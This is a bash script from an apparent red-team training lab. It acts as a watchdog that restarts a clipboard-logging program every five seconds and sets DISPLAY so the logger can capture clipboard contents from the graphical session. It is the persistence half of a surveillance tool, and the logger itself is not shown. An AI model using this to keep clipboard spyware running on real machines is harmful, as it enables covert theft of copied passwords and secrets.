#!/bin/bash
#
# Author: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Write a program that captures clipboard data
#
# Description: This bash script ensures that a clipboard logger program is continuously running. 
# It checks every 5 seconds if the logger process is active, and if not, starts it. 
# The script also verifies that the DISPLAY environment variable is set, defaulting to :0 if not, 
# ensuring proper GUI interaction for the logger in a graphical environment.


# Define the path to the logger program
LOGGER_PATH="/home/r365/Desktop/RedTeamTraining/ClipboardCapture/Logger/logger"

# Function to check if the logger is running
is_logger_running() {
    pgrep -f "$LOGGER_PATH" > /dev/null 2>&1
}

# Check if the logger program exists
if [ ! -f "$LOGGER_PATH" ]; then
    exit 1
fi

# Start the logger if it is not running
while true; do
    # Check if DISPLAY is set, and if not, set it to :0
    if [ -z "$DISPLAY" ]; then
        export DISPLAY=:0
    fi

    if ! is_logger_running; then
        "$LOGGER_PATH"
    fi
    sleep 5  # Check every 5 seconds
done
